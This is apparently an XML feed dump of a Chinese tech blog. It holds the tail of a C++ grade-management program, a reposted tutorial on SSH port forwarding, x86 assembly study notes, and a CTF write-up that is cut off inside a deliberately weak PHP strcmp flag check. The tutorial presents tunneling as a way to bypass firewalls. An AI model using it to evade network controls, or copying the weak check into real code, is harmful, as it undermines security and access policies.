学生成绩管理系统\n\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      1.显示所有学生成绩\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      2.添加信息\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      3.查询信息\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      4.删除信息\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      5.成绩排序\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      6.单科成绩分析\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      7.清空所有信息并退出系统\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      0.退出系统\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"===============================\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"                               \n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    studentMessage stuM=studentMessage();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        showMenu();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入操作对应的序号 : "</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt;h;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">switch</span>(h)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: stuM.showAll(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: stuM.add(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: stuM.search(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: stuM.del(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>: stuM.sort(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: stuM.showOne(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>: stuM.clear(); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n退出成功！"</span>;<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n输入序号有误！请输入正确的序号。"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSH端口转发</title>
      <link href="/2018/12/28/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2018/12/28/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！</p><h3 id="端口转发概述"><a href="#端口转发概述" class="headerlink" title="端口转发概述"></a>端口转发概述</h3><p>我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。总的来说 SSH 端口转发能够提供两大功能：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加密 SSH<span class="built_in"> Client </span>端至 SSH<span class="built_in"> Server </span>端之间的通讯数据。</span><br><span class="line">突破防火墙的限制完成一些之前无法建立的 TCP 连接。</span><br></pre></td></tr></table></figure><p>图 1. SSH 端口转发<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/411092.jpg" alt=""></p><p>如上图所示，使用了端口转发之后，TCP 端口 A 与 B 之间现在并不直接通讯，而是转发到了 SSH 客户端及服务端来通讯，从而自动实现了数据加密并同时绕过了防火墙的限制。</p><h2 id="本地转发与远程转发"><a href="#本地转发与远程转发" class="headerlink" title="本地转发与远程转发"></a>本地转发与远程转发</h2><h3 id="本地转发实例分析"><a href="#本地转发实例分析" class="headerlink" title="本地转发实例分析"></a>本地转发实例分析</h3><p>我们先来看第一个例子，在实验室里有一台 LDAP 服务器（LdapServerHost），但是限制了只有本机上部署的应用才能直接连接此 LDAP 服务器。如果我们由于调试或者测试的需要想临时从远程机器（LdapClientHost）直接连接到这个 LDAP 服务器 , 有什么方法能够实现呢？</p><p>答案无疑是本地端口转发了，它的命令格式是：</p><pre><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>在 LdapClientHost 上执行如下命令即可建立一个 SSH 的本地端口转发，例如：</p><pre><code>$ ssh -L 7001:localhost:389 LdapServerHost</code></pre><p><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/44696679.jpg" alt=""></p><p>这里需要注意的是本例中我们选择了 7001 端口作为本地的监听端口，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。</p><p>然后我们可以将远程机器（LdapClientHost）上的应用直接配置到本机的 7001 端口上（而不是 LDAP 服务器的 389 端口上）。之后的数据流将会是下面这个样子：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，</span><br><span class="line">而本机的 SSH<span class="built_in"> Client </span>会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH<span class="built_in"> Server </span>上。</span><br><span class="line">SSH<span class="built_in"> Server </span>会解密收到的数据并将之转发到监听的 LDAP 389 端口上，</span><br><span class="line">最后再将从 LDAP 返回的数据原路返回以完成整个流程。</span><br></pre></td></tr></table></figure><p>我们可以看到，这整个流程应用并没有直接连接 LDAP 服务器，而是连接到了本地的一个监听端口，但是 SSH 端口转发完成了剩下的所有事情，加密，转发，解密，通讯。</p><p>这里有几个地方需要注意：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SSH 端口转发是通过 SSH 连接建立起来的，我们必须保持这个 SSH 连接以使端口转发保持生效。</span><br><span class="line">一旦关闭了此连接，相应的端口转发也会随之关闭。</span><br><span class="line"></span><br><span class="line">我们只能在建立 SSH 连接的同时创建端口转发，而不能给一个已经存在的 SSH 连接增加端口转发。</span><br><span class="line"></span><br><span class="line">你可能会疑惑上面命令中的 &lt;remote host&gt; 为什么用 localhost，它指向的是哪台机器呢？</span><br><span class="line">在本例中，它指向 LdapServertHost 。我们为什么用 localhost 而不是<span class="built_in"> IP </span>地址或者主机名呢？</span><br><span class="line"></span><br><span class="line">其实这个取决于我们之前是如何限制 LDAP 只有本机才能访问。如果只允许 lookback 接口访问的话，那么自然就只有 localhost 或者<span class="built_in"> IP </span>为 127.0.0.1 才能访问了，而不能用真实<span class="built_in"> IP </span>或者主机名。</span><br><span class="line"></span><br><span class="line">命令中的 &lt;remote host&gt; 和 &lt;SSH hostname&gt; 必须是同一台机器么？其实是不一定的，它们可以是两台不同的机器。</span><br><span class="line">我们在后面的例子里会详细阐述这点。</span><br><span class="line"></span><br><span class="line">好了，我们已经在 LdapClientHost 建立了端口转发，那么这个端口转发可以被其他机器使用么？</span><br><span class="line"></span><br><span class="line">比如能否新增加一台 LdapClientHost2 来直接连接 LdapClientHost 的 7001 端口？</span><br><span class="line">答案是不行的，在主流 SSH 实现中，本地端口转发绑定的是 lookback 接口，</span><br><span class="line"></span><br><span class="line">这意味着只有 localhost 或者 127.0.0.1 才能使用本机的端口转发 , 其他机器发起的连接只会得到“<span class="built_in"> connection </span>refused. ”。</span><br><span class="line"></span><br><span class="line">好在 SSH 同时提供了 GatewayPorts 关键字，我们可以通过指定它与其他机器共享这个本地端口转发。</span><br><span class="line"></span><br><span class="line">ssh -g -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</span><br></pre></td></tr></table></figure><h3 id="远程转发实例分析"><a href="#远程转发实例分析" class="headerlink" title="远程转发实例分析"></a>远程转发实例分析</h3><p>我们来看第二个例子，这次假设由于网络或防火墙的原因我们不能用 SSH 直接从 LdapClientHost 连接到 LDAP 服务器（LdapServertHost），但是反向连接却是被允许的。那此时我们的选择自然就是远程端口转发了。</p><p>它的命令格式是：</p><pre><code>ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>例如在 LDAP 服务器（LdapServertHost）端执行如下命令：</p><pre><code>$ ssh -R 7001:localhost:389 LdapClientHost</code></pre><p>图 3. 远程端口转发<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/81519205.jpg" alt=""><br>和本地端口转发相比，这次的图里，SSH Server 和 SSH Client 的位置对调了一下，但是数据流依然是一样的。我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，而本机的 SSH Server 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Client 上。 SSH Client 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，最后再将从 LDAP 返回的数据原路返回以完成整个流程。</p><p>看到这里，你是不是会有点糊涂了么？为什么叫本地转发，而有时又叫远程转发？这两者有什么区别？</p><h3 id="本地转发与远程转发的对比与分析"><a href="#本地转发与远程转发的对比与分析" class="headerlink" title="本地转发与远程转发的对比与分析"></a>本地转发与远程转发的对比与分析</h3><p>不错，SSH Server，SSH Client，LdapServertHost，LdapClientHost，本地转发，远程转发，这么多的名词的确容易让人糊涂。让我们来分析一下其中的结构吧。首先，SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。</p><p>我们可以回忆上面的两个例子来做个对照。</p><p>本地转发时：</p><p>LdapClientHost 同时是应用的客户端，也是 SSH Client，这两个连接都从它指向 LdapServertHost（既是 LDAP 服务端，也是 SSH Server）。</p><p>远程转发时：</p><p>LdapClientHost 是应用的客户端，但却是 SSH Server ；而 LdapServertHost 是 LDAP 的服务端，但却是 SSH Client 。这样两个连接的方向刚好相反。</p><p>另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接。</p><p>弄清楚了两者的区别之后，再来看看两者的相同之处。如果你所在的环境下，既允许 LdapClientHost 发起 SSH 连接到 LdapServerHost，也允许 LdapServerHost 发起 SSH 连接到 LdapClientHost 。那么这时我们选择本地转发或远程转发都是可以的，能完成一样的功能。</p><p>接着让我们来看个进阶版的端口转发。我们之前涉及到的各种连接 / 转发都只涉及到了两台机器，还记得我们在本地转发中提到的一个问题么？本地转发命令中的 <remote host=""> 和 <ssh hostname=""> 可以是不同的机器么？</ssh></remote></p><pre><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>答案是可以的！让我们来看一个涉及到四台机器 (A,B,C,D) 的例子。</p><p>图 4. 多主机转发应用<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/37833316.jpg" alt=""><br>在 SSH Client(C) 执行下列命令来建立 SSH 连接以及端口转发：</p><pre><code>$ ssh -g -L 7001:&lt;B&gt;:389 &lt;D&gt;</code></pre><p>然后在我们的应用客户端（A）上配置连接机器（C ）的 7001 端口即可。注意我们在命令中指定了“ -g ”参数以保证机器（A）能够使用机器（C）建立的本地端口转发。而另一个值得注意的地方是，在上述连接中，（A）<-> (C) 以及 (B)<->(D) 之间的连接并不是安全连接，它们之间没有经过 SSH 的加密及解密。如果他们之间的网络并不是值得信赖的网络连接，我们就需要谨慎使用这种连接方式了。</-></-></p><h2 id="其他类型的转发"><a href="#其他类型的转发" class="headerlink" title="其他类型的转发"></a>其他类型的转发</h2><h3 id="动态转发实例分析"><a href="#动态转发实例分析" class="headerlink" title="动态转发实例分析"></a>动态转发实例分析</h3><p>恩，动态转发，听上去很酷。当你看到这里时，有没有想过我们已经讨论过了本地转发，远程转发，但是前提都是要求有一个固定的应用服务端的端口号，例如前面例子中的 LDAP 服务端的 389 端口。那如果没有这个端口号怎么办？等等，什么样的应用会没有这个端口号呢？嗯，比如说用浏览器进行 Web 浏览，比如说 MSN 等等。</p><p>当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览及 MSN 信息无疑是十分必要的。让我们先来看一下动态转发的命令格式：</p><pre><code>$ ssh -D &lt;local port&gt; &lt;SSH Server&gt;</code></pre><p>例如：</p><pre><code>$ ssh -D 7001 &lt;SSH Server&gt;</code></pre><p>图 5. 动态端口转发<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/94677613.jpg" alt=""></p><p>似乎很简单，我们依然选择了 7001 作为本地的端口号，其实在这里 SSH 是创建了一个 SOCKS 代理服务。来看看帮助文档中对 -D 参数的描述：</p><p>-D port<br> This works by allocating a socket to listen to port on the local<br> side, and whenever a connection is made to this port, the con-<br> nection is forwarded over the secure channel, and the applica-<br> tion protocol is then used to determine where to connect to from<br> the remote machine.  Currently the SOCKS4 and SOCKS5 protocols<br> are supported, and ssh will act as a SOCKS server.  Only root<br> can forward privileged ports.  Dynamic port forwardings can also<br> be specified in the configuration file.</p><p>之后的使用就简单了，我们可以直接使用 localhost:7001 来作为正常的 SOCKS 代理来使用，直接在浏览器或 MSN 上设置即可。在 SSH Client 端无法访问的网站现在也都可以正常浏览。而这里需要值得注意的是，此时 SSH 所包护的范围只包括从浏览器端（SSH Client 端）到 SSH Server 端的连接，并不包含从 SSH Server 端 到目标网站的连接。如果后半截连接的安全不能得到充分的保证的话，这种方式仍不是合适的解决方案。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，我们已经完成了本地端口转发，远程端口转发，动态端口转发以及 X 转发的介绍。回顾起来，总的思路是通过将 TCP 连接转发到 SSH 通道上以解决数据加密以及突破防火墙的种种限制。对一些已知端口号的应用，例如 Telnet/LDAP/SMTP，我们可以使用本地端口转发或者远程端口转发来达到目的。动态端口转发则可以实现 SOCKS 代理从而加密以及突破防火墙对 Web 浏览的限制。对于 X 应用，无疑是 X 转发最为适用了。虽然每一部分我们都只是简单的介绍了一下，但如果能灵活应用这些技巧，相信对我们的日常生活 / 工作也是会有所帮助的。</p><p>来自:<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>汇编指令学习</title>
      <link href="/2018/12/26/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/12/26/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="INT-OUT"><a href="#INT-OUT" class="headerlink" title="INT OUT"></a>INT OUT</h2><p><strong>期末的计算机组成原理的课程设计,要学习看懂汇编语言,记录一些汇编指令</strong><br>CPU对外设的操作通过专门的端口读写指令来完成；<br>　　读端口用IN指令，写端口用OUT指令。</p><pre><code>IN AL,21H；表示从21H端口读取一字节数据到ALIN AX,21H；表示从端口地址21H读取1字节数据到AL，从端口地址22H读取1字节到AH</code></pre><p>MOV DX,379H<br>　　IN AL,DX ；从端口379H读取1字节到AL<br>OUT 21H,AL；将AL的值写入21H端口<br>　　OUT 21H,AX；将AX的值写入端口地址21H开始的连续两个字节。</p><h2 id="assume-cs-code-ds-data"><a href="#assume-cs-code-ds-data" class="headerlink" title="assume cs:code,ds:data"></a>assume cs:code,ds:data</h2><p><strong>assume</strong>，这个单词是“假设”的意思,告诉编译器，段寄存器和段名之间的关系<br>这是段分配语句，是条伪指令，一般放在代码段的第一条位置，段分配语句仅仅是建立段寄存器和段名之间关系，不具有赋值功能，<br>比如你创建了几个段，怎么知道它是代码段，它是数据段，就靠这条语句，<br>因为段名是可以随意取的，你可以把code取成代码段，也可以是其他名字，通过这条语句就可以把他们的关系建立起来</p><pre><code>mov dx,offset s</code></pre><p>这句话意思是将s的偏移地址传给dx</p><h2 id="data-segment"><a href="#data-segment" class="headerlink" title="data segment"></a>data segment</h2><p>叫完整段定义<br>可以随意设置段属性，随意使用各种段<br>但在不熟悉该环境下段的定义约定，建议使用简化段定义，否则造成一系列兼容问题<br>汇编的基本框架</p><pre><code>CODE SEGMENT START: ........ //定义代码段 当然就是要执行的程序代码了 CODE ENDS END START</code></pre><h2 id="int-21h"><a href="#int-21h" class="headerlink" title="int 21h"></a>int 21h</h2><p>是DOS的中断调用<br>比如</p><pre><code>MOV AH 4CHINT 21H</code></pre><p>是返回DOS系统的<br>通过给AH寄存器赋值4CH，然后调用INT 21H指令，计算机就会根据AH寄存器中的值执行相应的操作，<br>其中4CH是返回DOS系统，还可给AH寄存器赋其他值，所对于的操作这里也有</p><h2 id="lea指令"><a href="#lea指令" class="headerlink" title="lea指令"></a>lea指令</h2><p>就是目标地址传送指令： 将一个近地址指针写入到指定的寄存器。格式：<br>LEA reg16,mem16<br>其中reg16必须是一个16位通用寄存器，mem16必须是一个存储器，执行这个指令后，就将mem16所指的16位偏移地址传送reg16中。<br>比如： LEA AX,BUF<br>就是将存储器中BUF所指的地址传送给AX.<br>区别MOV传送指令：<br>MOV传送的是地址所指的内容，而LEA只是地址。<br>当源操作数很简单的情况下，完全可以用mov指令代替lea指令，<br>如lea esi,Buffer，完全可以用指令mov esi,offset Buffer代替；<br>但当源操作数稍微复杂一点的话，单用mov指令就代替不了了，至少要用到算术运算指令。<br>指令集中提供lea指令，就是为了减少这些计算上的麻烦。</p><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><p>可以认为是compare（比较）的意思。在进行比较的时候将个数做减法运算，这个运算是影响符号位的，（大数减小数，符号位为+，反则为-）<br>所以执行该指令后你可以通过查询符号位CF是0还是1就可以知道两个数那个大了。</p><h2 id="jnc"><a href="#jnc" class="headerlink" title="jnc"></a>jnc</h2><p>可用于两个数的判断！jnc是进位位为0则转移！而两个数的比较就是想减，<br>例如X-Y，X小于Y,X就要借位，这样进位位就为1，如果X大于Y，X就不需要借位，这样进位位为0<br>jnc是一条跳转指令，当进位标记C为0时跳转，为1时执行后面的指令。</p><h2 id="OF与CF的区别"><a href="#OF与CF的区别" class="headerlink" title="OF与CF的区别"></a>OF与CF的区别</h2><p>of的设置，以加法为例，如果两数符号相同，结果却相反，则of=1；否则of=0；（如果两数符号相反，是不会溢出的）。<br>cf的设置，最高有效位（bit7，比如）向高位进位则为1，否则为0。所以实际上of是表示有符号数的溢出，cf是表示无符号数的溢出。</p><h2 id="jz"><a href="#jz" class="headerlink" title="jz"></a>jz</h2><p>JZ（Jump if Zero）是此前的运算结果为0时跳转。<br>若此前运算结果不为0，则不跳转，执行JZ指令后面的下一条指令。<br>判断结果是否为零，靠的是ZF标志位状态。<br>若结果是0，则ZF=1<br>若结果不是0，则ZF=0<br>所以，JZ指令是在ZF=1时跳转，ZF=0时不跳转。</p><h2 id="jz与jnz的区别"><a href="#jz与jnz的区别" class="headerlink" title="jz与jnz的区别"></a>jz与jnz的区别</h2><p>jnz结果不为零（或不相等）则转移。</p><p>jz即零标志为1就跳转。</p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>测试(两操作数作与运算,仅修改标志位,不回送结果).<br>TEST AX,BX 与 AND AX,BX 命令有相同效果<br>ret指令和retf指令<br>ret指令用栈中的数据，修改IP的内容，从而实现近转移<br>retf指令用栈的数据，修改CS和IP的内容，从而实现远转移</p><p>CPU执行ret指令时，相当于进行：</p><p>pop IP</p><p>CPU执行retf指令时，相当于进行：</p><p>pop IP<br>pop CS</p><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>CALL（LCALL）指令执行时，进行两步操作：<br>（1）将程序当前执行的位置IP压入堆栈中； 　　（2）转移到调用的子程序。<br>JMP和CALL的一个朴实的区别就是：<br>JMP跳走之后，它可以跳回来，也可以再跳到别的地方不回去。<br>CALL调用子程序后，就算再调用别的子程序也一定会返回主程序。<br>JMP和CALL在有些时候应该都可以用吧→ _→ </p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>pop ax ，就是将栈顶的那个数取出并存入到ax寄存器中<br>push ax  是把ax里的值压入堆栈</p><h2 id="rol"><a href="#rol" class="headerlink" title="rol"></a>rol</h2><p>ROL和ROR指令<br>循环左移/右移指令只是移位方向不同，它们移出的位不仅要进入CF，而且还要填补空出的位。</p><p>例如:</p><pre><code>MOV AL,82HROL AL,1</code></pre><p>首先把82H转换成二进制数10000010B<br>循环左移1位后变成：00000101B，换算成十六进制数便是05H<br>循环右移1位后变成：01000001B，换算成十六进制数便是41H</p><h2 id="DEC"><a href="#DEC" class="headerlink" title="DEC"></a>DEC</h2><p>DEC是减1指令，该指令使操作数的内容减1，然后再送回该操作数。该操作数可以是寄存器操作数、存储器操作数。<br>例如：<br>DEC AL;AL内容减1，然后再送AL<br>DEC AX;AX减内容1，然后再送AX<br>DEC CONT;CONT减内容1，然后再送CONT</p><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p>是子程序定义伪指令， far是该子程序的属性，决定调用程序和子程序是否在同一代码段<br>如下：为子程序定义及说明，</p><pre><code>子程序名 PROC NEAR ( 或 FAR )……ret子程序名 ENDP子程序名为符合语法的标识符</code></pre><p>NEAR属性(段内近调用): 调用程序和子程序在同一代码段中,只能被相同代码段的其他程序调用;<br>FAR属性(段间远调用): 调用程序和子程序不在同一代码段中,可以被相同或不同代码段的程序调用.</p><h2 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h2><p>LEA指令的功能是取偏移地址，例如LEA AX,[1000H]，作用是将源操作数[1000H]的偏移地址1000H送至AX；<br>MOV指令的功能是传送数据，例如MOV AX,[1000H]，作用是将1000H作为偏移地址，寻址找到内存单元，将该内存单元中的数据送至AX；<br>LEA指令的功能是取偏移地址，例如LEA AX,[1000H]，作用是将源操作数[1000H]的偏移地址1000H送至AX。理解时，可直接将[ ]去掉，等同于MOV AX,1000H。<br>再如：LEA BX,[AX]，等同于MOV BX,AX；LEA BX,TABLE 等同于 MOV BX,OFFSET TABLE。<br>但有时不能直接使用MOV代替：<br>比如：</p><pre><code>LEA AX,[SI+6] 不能直接替换成：MOV AX,SI+6；但可替换为：MOV AX,SIADD AX,6两步完成。</code></pre><h2 id="xlat"><a href="#xlat" class="headerlink" title="xlat"></a>xlat</h2><p>是一种指令程序。操作是以DS:[BX+AL]为地址，提取存储器中的一个字节再送入AL。<br>例一</p><pre><code>X DW 1122H,3344H,5566H,7788H。LEA BX,X。MOV AL,03H。XLAT。</code></pre><p>结果AL为33H。<br>XLAT作用:将((BX)+(AL))送给(AL)—-简单:将BX为首地址的,偏移地址为AL的内容送给AL。<br>在运行XLAT之前,AL=3 BX=(X的首地址)。<br>这时BX+AL就是33….为什么?注意高地址放在下面。<br>也就是。<br>22——BX指向这里。<br>11。<br>44。<br>33—–偏移地址AL为3的位置就是这里。<br>XLAT X。<br>在执行XLAT之前,先将X的地址送给BX,偏移次数送给AL。<br>XLAT即为查找指令 (一个字节)。</p><h2 id="shl和shr指令"><a href="#shl和shr指令" class="headerlink" title="shl和shr指令"></a>shl和shr指令</h2><p>shl和shr是逻辑移位指令。</p><p>shl是逻辑左移指令，它的功能为：</p><p>（1）将一个寄存器或内存单元中的数据向左移位；</p><p>（2）将最后移出的一位写入CF中；</p><p>（3）最低位用0补充。</p><p>指令：<br>mov al,01001000b</p><p>shl al,1 ;将al中数据左移一位</p><p>执行后（al）=10010000b，CF=0。</p><p>注意：</p><p>如果移动位数大于1时，必须将移动位数放在cl中。</p><p>比如，指令：</p><p>mov al,01010001b</p><p>mov cl,3</p><p>shl al,cl</p><p>执行后（al）=10001000b，因为最后移出的一位是0，所以CF=0。</p><p>shr是逻辑右移指令，它和shl所进行的操作刚好相反。</p><h2 id="SP-BP-SI-DI作用"><a href="#SP-BP-SI-DI作用" class="headerlink" title="SP,BP ,SI,DI作用"></a>SP,BP ,SI,DI作用</h2><p>sp:表示栈顶指针,指向栈顶地址.与SS相配合使用.ss为栈段.</p><p>bp:是基址指针,段地址默认在SS中.可以定位物理地址,比如:”mov ax,[bp+si+6]/mov ax,[bp+di+6].</p><p>DI:是目的变址寄存器.一般情况下与ds联用,来确定某个储存单元的地址.</p><p>SI:是源变址寄存器,默认段地址和DI一样,在DS中.和DS联用.</p><p>这四个寄存器,都是16位的,不可以分割为八位.</p><p>要注意,1,sp和bp段地址默认在SS中.2..sp指向栈顶元素地址.有自加和自减能力,而bp没有.但是bp可以定位栈中某个元素的物理地址.</p><p>DI和SI</p><p>这两个属于变址寄存器.可以和bx.bp联用,但是和bx连用时,段地址在DS中,和bp联用时,段地址在SS中.也可以单独使用,单独使用时,段地址默认在DS中,想要越段使用,加上段前缀即可.</p><p>在串指令操作中,si和ds联用,确定目标源地址,di和es(附加段寄存器)联用,确定传送的目的地址.说白了就是,分别寻址数据段和附加段.</p><p>在串指令中,si和di具有自加和自减功能,</p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018中原工学院网络安全校赛</title>
      <link href="/2018/12/24/2018%E4%B8%AD%E5%8E%9F%E5%B7%A5%E5%AD%A6%E9%99%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A0%A1%E8%B5%9B/"/>
      <url>/2018/12/24/2018%E4%B8%AD%E5%8E%9F%E5%B7%A5%E5%AD%A6%E9%99%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A0%A1%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="Drops攻防训练营欢迎你的加入"><a href="#Drops攻防训练营欢迎你的加入" class="headerlink" title="Drops攻防训练营欢迎你的加入"></a>Drops攻防训练营欢迎你的加入</h2><p>打开页面查看响应头有一个 tips:4he9e.txt 然后访问这个页面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = <span class="string">"***"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'repo'</span>])) &#123;  </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'repo'</span>], $flag) == <span class="number">0</span>) </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>  </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span></span><br><span class="line"><span 